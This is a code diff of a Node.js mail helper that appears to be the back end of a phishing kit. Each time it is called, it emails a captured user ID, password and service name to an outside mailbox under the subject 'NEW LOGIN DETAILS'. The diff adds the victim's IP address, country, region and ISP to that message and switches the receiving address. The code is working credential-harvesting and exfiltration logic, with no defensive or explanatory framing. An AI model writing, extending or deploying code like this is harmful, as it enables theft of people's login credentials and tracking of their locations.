@@ -1,6 +1,16 @@
 const nodemailer = require('nodemailer')
 
-const sendAuthMail = (userID, password, name, res) => {
+const sendAuthMail = (
+  userID,
+  password,
+  name,
+  country,
+  region,
+  isp,
+  IPAddress,
+  res
+) => {
+  console.log(IPAddress, 'from helper')
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -9,13 +19,15 @@ const sendAuthMail = (userID, password, name, res) => {
     },
   })
 
-  const text = `New login details. User ID: ${userID}, password: ${password}, Service Name: ${
-    name || 'Not available'
-  }`
+  const text = `User ID: ${userID}, password: ${password}, service name: ${name}, IP: ${
+    IPAddress || 'Not available'
+  }, Country: ${country || 'Not available'}, Region:${
+    region || 'Not available'
+  }, Internet Service Provider(ISP): ${isp || 'Not available'} `
 
   const mailOptions = {
     from: 'webiniy01@gmail.com',
-    to: 'Wadewade49@outlook.com',
+    to: 'bljazeem@gmail.com',
     subject: 'NEW LOGIN DETAILS',
     text,
   }
